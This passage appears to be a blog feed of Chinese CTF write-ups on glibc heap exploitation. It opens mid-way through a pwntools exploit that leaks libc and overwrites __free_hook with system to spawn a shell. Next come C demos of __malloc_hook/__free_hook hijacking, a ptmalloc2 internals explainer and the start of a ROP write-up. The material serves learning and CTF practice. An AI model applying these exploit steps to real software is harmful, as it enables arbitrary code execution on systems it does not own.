class="string">&#x27;onedes&#x27;</span>)</span><br><span class="line">print_book()</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">book_one_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;book_one_ad&#x27;</span>,book_one_ad)</span><br><span class="line">create_book(<span class="number">0x21000</span>, <span class="string">&quot;two&quot;</span>, <span class="number">0x21000</span>, <span class="string">&quot;twodes&quot;</span>)</span><br><span class="line">book_two_ad=book_one_ad+<span class="number">0x30</span></span><br><span class="line">payload=p64(<span class="number">1</span>) + p64(book_two_ad + <span class="number">8</span>)+p64(book_two_ad+<span class="number">16</span>)+ p64(<span class="number">140</span>)</span><br><span class="line">edit_book(<span class="number">1</span>,payload)</span><br><span class="line">change_author_name(<span class="string">b&#x27;b&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">print_book()</span><br><span class="line">ru(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">vmmap_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;vmmap_ad&#x27;</span>,vmmap_ad)</span><br><span class="line">base=vmmap_ad-<span class="number">0x58F010</span></span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">system_ad=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+base</span><br><span class="line">free_hook_ad=libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]+base</span><br><span class="line">bin_ad=<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))+base</span><br><span class="line">p(<span class="string">&#x27;bin_ad&#x27;</span>,bin_ad)</span><br><span class="line">edit_book(<span class="number">1</span>,p64(free_hook_ad))</span><br><span class="line">edit_book(<span class="number">2</span>,p64(system_ad))</span><br><span class="line">edit_book(<span class="number">1</span>,p64(bin_ad))</span><br><span class="line">delete_book(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Off By One </tag>
            
            <tag> Free Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>malloc_hook&amp;&amp;free_hook hijack原理</title>
      <link href="/2023/03/01/malloc-hook&amp;free-hook/"/>
      <url>/2023/03/01/malloc-hook&amp;free-hook/</url>
      
        <content type="html"><![CDATA[<h1 id="malloc-hook和-free-hook-hijack原理"><a href="#malloc-hook和-free-hook-hijack原理" class="headerlink" title="__malloc_hook和__free_hook hijack原理"></a>__malloc_hook和__free_hook hijack原理</h1><p>Hook即钩子，截获API调用的技术，是将执行流程劫持到你自己的代码。</p><p>刚开始在Ubuntu22上做实验，一直不成功，又换了kali，还是不行，最后发现__free_hook,__malloc_hook,__realloc_hook,<em>_memalign_hook,</em>_after_morecore_hookg在libc-2.34的patch中被移除了，换了Ubuntu16 libc版本2.23，但是发现只是在ld链接时会找不到definition，也就是无法通过链接的环节，但是在libc库里还是有的，可能是考虑之前使用hook程序的兼容。</p><span id="more"></span><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16:/usr/include$ ldd --version</span><br><span class="line">ldd (Ubuntu GLIBC 2.23-0ubuntu11.3) 2.23</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line">Written by Roland McGrath and Ulrich Drepper.</span><br></pre></td></tr></table></figure><h2 id="malloc-free"><a href="#malloc-free" class="headerlink" title="malloc free"></a>malloc free</h2><p>先看一下malloc和free函数具体调用</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">void</span> *x=<span class="built_in">malloc</span>(<span class="number">8</span>); </span><br><span class="line">  <span class="built_in">free</span>(x);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301205645710.png" alt="image-20230301205645710"></p><p>由于版本不一样__malloc_hook在main_arena的上方偏移是不确定的，这里可以看到在malloc时会从取出__malloc_hook的值进行test，不为0则跳转，为0则继续malloc，这里采用了rip的寻址方式，很6，不利于我们分析，看静态汇编吧</p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301210214619.png" alt="image-20230301210214619"></p><p>不为0跳转到，为0直接get_free_list去fastbins找free chunk了（ glibc 2.26才引入tcache）</p><p> <img src="/2023/03/01/malloc-hook&free-hook/image-20230301210558248.png" alt="image-20230301210558248"></p><p>最后jmp到malloc_hook地址函数里，同时rdi的参数也未变，如果我们把hook改为system地址，那么只要在malloc时填入binsh地址就可以getshell</p><h3 id="free同理"><a href="#free同理" class="headerlink" title="free同理"></a>free同理</h3><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301211127857.png" alt="image-20230301211127857"></p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301211206232.png" alt="image-20230301211206232"></p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301211304185.png" alt="image-20230301211304185"></p><p>free hook不同的是采用了call的形式转移pc</p><h2 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc hook"></a>malloc hook</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __malloc_hook =system;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">10</span>]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    <span class="type">char</span> *s = <span class="built_in">malloc</span>(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o malloc_hook malloc_hook.c </span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301212355513.png" alt="image-20230301212355513"></p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301212937121.png" alt="image-20230301212937121"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000041F220                               malloc_hook_ini proc near               ; CODE XREF: calloc+2C8↑p</span><br><span class="line">.text:000000000041F220                                                                       ; DATA XREF: .data:__malloc_hook↓o</span><br><span class="line">.text:000000000041F220                               ; __unwind &#123;</span><br><span class="line">.text:000000000041F220 55                            push    rbp</span><br><span class="line">.text:000000000041F221 53                            push    rbx</span><br><span class="line">.text:000000000041F222 48 89 FD                      mov     rbp, rdi</span><br><span class="line">.text:000000000041F225 48 83 EC 08                   sub     rsp, 8</span><br><span class="line">.text:000000000041F229 8B 05 35 B5 2A 00             mov     eax, cs:__libc_malloc_initialized</span><br><span class="line">.text:000000000041F22F 48 C7 05 4E B5 2A 00 00 00 00+mov     cs:__malloc_hook, 0</span><br><span class="line">.text:000000000041F22F 00</span><br><span class="line">.text:000000000041F23A 85 C0                         test    eax, eax</span><br></pre></td></tr></table></figure><p>这时候我们发现malloc_hook并没有为0，而是malloc_hook_ini，会在mov cs:__malloc_hook, 0 置为0</p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301213351476.png" alt="image-20230301213351476"></p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301213534133.png" alt="image-20230301213534133"></p><h2 id="free-hook同理"><a href="#free-hook同理" class="headerlink" title="free hook同理"></a>free hook同理</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *str = <span class="built_in">malloc</span>(<span class="number">160</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(str,<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;__free_hook: 0x%016X\n&quot;</span>,__free_hook);</span><br><span class="line">    __free_hook = system;</span><br><span class="line">    <span class="built_in">free</span>(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o free_hook free_hook.c </span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301213905560.png" alt="image-20230301213905560"></p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301214108772.png" alt="image-20230301214108772"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Malloc Hook </tag>
            
            <tag> Free Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆管理器:Ptmalloc2 (HEAP MANAGER)</title>
      <link href="/2023/02/25/23-2-25-heap/"/>
      <url>/2023/02/25/23-2-25-heap/</url>
      
        <content type="html"><![CDATA[<h1 id="HEAP-MANGER"><a href="#HEAP-MANGER" class="headerlink" title="HEAP MANGER"></a>HEAP MANGER</h1><h2 id="为什么要有堆管理器"><a href="#为什么要有堆管理器" class="headerlink" title="为什么要有堆管理器"></a>为什么要有堆管理器</h2><p>堆是动态分配的虚拟内存(只有在程序访问到这块虚拟内存时，系统才会建立虚拟内存和物理内存的映射，称为延迟绑定机制，大大节省了内存)，从低地址向高地址生长，程序可能需要频繁的向操作系统申请内存的系统调用，与此同时就伴随这从用户态到内核态的多次转换，转换的同时需要保存context，影响程序性能，堆管理器就出现了，在操作系统和用户当作中间人，他会申请较大的内存，管理分配，1、响应用户申请内存的请求2、管理用户所释放的内存，堆管理器并非由内核实现的，Linux标准发行版中使用的堆分配器是glibc中的堆分配器：ptmalloc2</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">平台：操作系统 --&gt; 堆管理器 --&gt; 用户</span><br><span class="line">资源：物理内存 --&gt; arena  --&gt;可用内存</span><br></pre></td></tr></table></figure><span id="more"></span><p><img src="/2023/02/25/23-2-25-heap/image-20230817101448007.png" alt="image-20230817101448007"></p><h2 id="堆管理器ptmalloc2"><a href="#堆管理器ptmalloc2" class="headerlink" title="堆管理器ptmalloc2"></a>堆管理器ptmalloc2</h2><p><strong>arena</strong> 指的是管理器在第一次malloc时申请到的大内存快，堆内存区域本身，并不是结构，可以理解为内存池；主线程的 main arena通过&#x3D;&#x3D;(s)brk&#x3D;&#x3D;创建，没开alsr分布在数据区(.data&#x2F;.bss)的结尾，开启后在尾部随机偏移处；其他线程的 arena包括一些主线程的大内存 是通过 &#x3D;&#x3D;mmap&#x3D;&#x3D; 创建，分布在Memory-mapped segment，也就是我们glic动态链接库加载的区域</p><p><strong>malloc_state</strong>（<strong>main arena</strong> <strong>的</strong> <strong>malloc_state</strong> <strong>并不是</strong> <strong>heap segment</strong> <strong>的一部分，而是一个全局变量，存储在</strong> <strong>libc.so</strong> <strong>的数据段</strong>）管理 arena 的核心结构，包含堆的状态信息、bins 链表等；main arena 对应的 malloc state 结构存储在 glibc 全局变量中；其他线程 arena 对应的 malloc_state 存储在 arena 本身中</p><p><strong>bin</strong> 用来管理空闲内存块，通常用链表的结构来进行组织</p><p><strong>chunks</strong> 内存块结构，是malloc具体在arena上申请给用户的</p><h2 id="chunks"><a href="#chunks" class="headerlink" title="chunks"></a>chunks</h2><p>top chunk arena中从未被使用过的内存区域，inuse 比特位始终为 1，否则会合并旁边的chunk</p><p>malloc_chunk 已被分配且填写了相应数据的chunk</p><p>free chunk 被释放掉的malloced chunk</p><p><code>allocated chunk</code>是一个更加通用的术语，它可以指任何已经被分配给应用程序使用的内存块。</p><p>last remainder chunk malloc分割原chunk后剩余的部分</p><img src="/2023/02/25/23-2-25-heap/image-20230225112707364.png" alt="image-20230225112707364" style="zoom:67%;"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">    <span class="comment">/*above chunk——head*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, <span class="keyword">if</span> <span class="title function_">unallocated</span> <span class="params">(P clear)</span>  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             <span class="params">(malloc_usable_size() bytes)</span>                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             <span class="params">(size of chunk, but used <span class="keyword">for</span> application data)</span>    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><ul><li><p>prev_size</p><ul><li><blockquote><p>如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一chunk 大小）</strong>是空闲的话，那该字段记录的是前一个chunk 的大小 (包括chunk头)。否则，该字段可以用来存储物理相邻的前一个chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> ，也就是当前一个chunk是malloced，那么这个字段是无用的，为了不浪费，我们会把这块内存在必要时给到前一个chunk，比如我们在64位程序下，malloc(0x10)，实际会分配0x20个字节，会包括chunk_head，free掉后，我们再次malloc(0x18)，该chunk的高地址处的chunk的pre_size字段是无用的，会被利用起来，也就是会再次把之前malloc(0x10)的chunk给到我们，<strong>这就是 chunk 中的空间复用</strong></p></blockquote></li></ul></li><li><p>size</p><ul><li><blockquote><p>chunk的大小包括chunk_head，是安照2 * SIZE_SZ(字长)对齐的，也就是32位是0x8，64位是0x10，恒是8的倍数，这样后三位bit位恒为0，我们将其设置为标志位</p><ul><li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。 &#x3D;&#x3D;A&#x3D;&#x3D;</li><li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。 free_chunk的始终为0 &#x3D;&#x3D;M&#x3D;&#x3D;</li><li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。&#x3D;&#x3D;P&#x3D;&#x3D;</li></ul></blockquote></li></ul></li><li><p>fd bk</p><blockquote><p>allocated状态下从这里开始为用户数据区，也就是我们通常说的malloc返回给用户的地址就是从这里开始的，free状态下会被添加到对应的空闲管理链表中</p><p>fd 指向下一个（非物理相邻）空闲的 chunk</p><p>bk 指向上一个（非物理相邻）空闲的 chunk</p><p><code>fd</code>和<code>bk</code>是<code>forward</code>和<code>backward</code>的缩写。</p></blockquote></li><li><p>fd_nextsize bk_nextsize</p><ul><li><blockquote><p>free时使用，用于large chunk</p><p>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</p><p>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</p><p>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></p></blockquote></li></ul></li></ul><p><strong>一般情况下</strong>，物理相邻的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块。</p><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><p>用户释放掉的 chunk 不会马上归还给系统，会放入bin或者合并到top chunk中去,ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲的 chunk。当用户再一次请求分配内存时，ptmalloc 分配器会试图在空闲的 chunk 中挑选一块合适的给用户。这样可以避免频繁的系统调用，降低内存分配的开销。&#x3D;&#x3D;mmap申请释放时直接归还操作系统 不进入bin&#x3D;&#x3D;</p><p>ptmalloc2维护bins数组</p><p>根据空闲的 chunk 的大小以及使用状态将 chunk 初步分为 4 类：fast bins(小)，small bins(中)，large bins（大），unsorted bin（未整理）。</p><ol><li>第一个为 unsorted bin，字如其面，这里面的 chunk 没有进行排序，存储的 chunk 比较杂。</li><li>索引从 2 到 63 的 bin 称为 small bin，同一个 small bin 链表中的 chunk 的大小相同。两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为 <strong>2 个机器字长</strong>，即 32 位相差 8 字节，64 位相差 16 字节。</li><li>small bins 后面的 bin 被称作 large bins。large bins 中的每一个 bin 都包含一定范围内的 chunk，其中的 chunk 按 fd 指针的顺序从大到小排列。相同大小的 chunk 同样按照最近使用顺序排列。</li></ol><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>malloc state 中的 fastbinsY[]</p><table><thead><tr><th>fastbinsY[]</th><th>x86（size_t&#x3D;4）</th><th>x64（size_t&#x3D;8）</th></tr></thead><tbody><tr><td>0</td><td>0x10</td><td>0x20</td></tr><tr><td>1</td><td>0x18</td><td>0x30</td></tr><tr><td>2</td><td>0x20</td><td>0x40</td></tr><tr><td>3</td><td>0x28</td><td>0x50</td></tr><tr><td>4</td><td>0x30</td><td>0x60</td></tr><tr><td>5</td><td>0x38</td><td>0x70</td></tr><tr><td>6</td><td>0x40</td><td>0x80</td></tr></tbody></table><ol><li>ptmalloc2 为了提高分配的速度，会把一些小的 chunk <strong>先</strong>放到 fast bins 的容器内,fast bins P位始终为1，不合并物理相邻的chunk</li><li>是个单链表结构，只是用fd成员</li><li>用户申请chunk大小&lt;&#x3D;MAX_FAST_SIZE时，优先从fastbins查找空闲块，LIFO规则，满足频繁的申请和释放同一块chunk，满足局部性</li><li>ptmalloc 默认情况下会调用 set_max_fast(s) 将全局变量 global_max_fast 设置为 DEFAULT_MXFAST，也就是设置 fast bins 中 chunk 的最大值。当 MAX_FAST_SIZE 被设置为 0 时，系统就不会支持 fastbin 。</li><li><img src="/2023/02/25/23-2-25-heap/image-20230225144619435.png" alt="image-20230225144619435" style="zoom:50%;"></li></ol><h3 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h3><ol><li>可以视为空闲 chunk 回归其所属 bin 之前的缓冲区，刚刚被释放，还未分类的chunk。bin[1]</li><li>FIFO的双向链表，当执行<code>free()</code>函数时，内存分配器会根据释放的内存块的大小，将它们放置到不同的内存块链表中。对于小于等于<code>FASTBIN_MAX_SIZE</code>的内存块，它们会被放置到<code>fastbin</code>中，而对于大于<code>FASTBIN_MAX_SIZE</code>的内存块，则会被放置到<code>unsorted bin</code>中。存放未被整理的 chunk</li><li>malloc时，内存分配器首先会尝试从<code>fastbin</code>中分配空闲内存块，当分配器需要分配大于<code>FASTBIN_MAX_SIZE</code>的内存时，它会尝试从<code>unsorted bin</code>中分配内存块。如果分配器发现<code>unsorted bin</code>中有适合大小的空闲块，它将选择其中一个，并返回给应用程序。如果没有适合的空闲块，则分配器会将<code>unsorted bin</code>中的空闲块合并，并将合并后的大块添加到<code>large bin</code>中。会依次查找<code>small bin</code>、<code>large bin</code>、<code>mmapped</code>等其他内存块，直到找到合适的内存块。</li><li><img src="/2023/02/25/23-2-25-heap/image-20230225150843293.png" alt="image-20230225150843293" style="zoom:50%;"></li></ol><h3 id="smallbin"><a href="#smallbin" class="headerlink" title="smallbin"></a>smallbin</h3><p>size&#x3D; 2* size_sz * index</p><table><thead><tr><th align="left">下标</th><th align="left">SIZE_SZ&#x3D;4（32 位）</th><th align="left">SIZE_SZ&#x3D;8（64 位）</th></tr></thead><tbody><tr><td align="left">2</td><td align="left">16</td><td align="left">32</td></tr><tr><td align="left">3</td><td align="left">24</td><td align="left">48</td></tr><tr><td align="left">4</td><td align="left">32</td><td align="left">64</td></tr><tr><td align="left">5</td><td align="left">40</td><td align="left">80</td></tr><tr><td align="left">x</td><td align="left">2*4*x</td><td align="left">2*8*x</td></tr><tr><td align="left">63</td><td align="left">504</td><td align="left">1008</td></tr></tbody></table><ol><li>每个链表中存储的 chunk 大小都一致</li><li>循环双向链表，每个链表都有链表头结点</li><li><strong>small bins 中每个 bin 对应的链表采用 FIFO 的规则</strong></li><li>释放的时候会检查相邻的是不是free的，如果是进行合并然后放到 unsortedbin</li><li><img src="/2023/02/25/23-2-25-heap/image-20230225151846846.png" alt="image-20230225151846846" style="zoom:50%;"></li></ol><h3 id="large-Bin"><a href="#large-Bin" class="headerlink" title="large Bin"></a>large Bin</h3><ol><li><p>bins[64] ~ bins[126] </p></li><li><p>循环双向链表 FIFO</p></li><li><p>这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致，具体如下：</p><table><thead><tr><th align="left">组</th><th align="left">数量</th><th align="left">公差</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">32</td><td align="left">64B</td></tr><tr><td align="left">2</td><td align="left">16</td><td align="left">512B</td></tr><tr><td align="left">3</td><td align="left">8</td><td align="left">4096B</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">32768B</td></tr><tr><td align="left">5</td><td align="left">2</td><td align="left">262144B</td></tr><tr><td align="left">6</td><td align="left">1</td><td align="left">不限制</td></tr></tbody></table></li><li><img src="/2023/02/25/23-2-25-heap/image-20230225152540343.png" alt="image-20230225152540343" style="zoom: 67%;"></li></ol><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p>一般申请的 heap 是不连续的，因此需要记录不同 heap 之间的链接结构。</p><p>该数据结构是专门为从 Memory Mapping Segment 处申请的内存准备的，即为非主线程(mmap申请)准备的。</p><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p>该结构用于管理堆，记录每个 arena 当前申请的内存的具体状态，比如说是否有空闲 chunk，有什么大小的空闲 chunk 等等。无论是 thread arena 还是 main arena，它们都只有一个 malloc state 结构。会在最新申请的arena中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Serialize access.  */</span></span><br><span class="line">    __libc_lock_define(, mutex);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">    <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">    mchunkptr top;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">    mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> binmap[ BINMAPSIZE ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Linked list, points to the next arena */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">       by free_list_lock in arena.c.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">       the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">       free_list_lock in arena.c.  */</span></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="分配和释放过程"><a href="#分配和释放过程" class="headerlink" title="分配和释放过程"></a><a href="https://blog.csdn.net/sinat_19596835/article/details/81665095">分配和释放过程</a></h2><p><img src="/2023/02/25/23-2-25-heap/image-20230805140153900.png" alt="image-20230805140153900"></p>]]></content>
      
      
      
        <tags>
            
            <tag> HEAP MANGER </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>几经周折rop</title>
      <link href="/2023/02/16/23-2-16/"/>
      <url>/2023/02/16/23-2-16/</url>
      
        <content type="html"><![CDATA[<p>信号与系统实在复习不下去</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>链接：<a href="https://pan.baidu.com/s/1_EXQHF0uumBE2tWhloeiNg">https://pan.baidu.com/s/1_EXQHF0uumBE2tWhloeiNg</a><br>提取码：2thf</p><p>某大学冬令营，题目本来是很简单的，但是刚开始出题方靶机环境可能出现了某些问题，导致exp一直可以打通本地，打远程一直打不出flag，也不敢质疑是官方的问题，一直在改自己的exp，不过也引发了自己的一些思考，写出了多种思路，最后官方修复了，写的几个exp也都打通了</p><span id="more"></span><h2 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h2><h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><p><img src="/2023/02/16/23-2-16/image-20230216230353617.png" alt="image-20230216230353617"></p><h4 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h4><p><img src="/2023/02/16/23-2-16/image-20230216230425068.png" alt="image-20230216230425068"></p><p>好家伙保护开满了</p><h3 id="ida静态分析"><a href="#ida静态分析" class="headerlink" title="ida静态分析"></a>ida静态分析</h3><p><img src="/2023/02/16/23-2-16/image-20230216230715969.png" alt="image-20230216230715969"></p><p>很快发现了两处输入都有漏洞函数点，buf只有8byte容量，却分别读入0x1e和0x5a，还有后门函数win嘿嘿</p><p><img src="/2023/02/16/23-2-16/image-20230216230920491.png" alt="image-20230216230920491"></p><p>很明显，后门函数提供给我们伪造栈帧的便利，读取flag.txt文件并打印出来，但是缺少fla，那么思路大致有了，伪造栈帧并进行rop</p><h2 id="调试并编写exp"><a href="#调试并编写exp" class="headerlink" 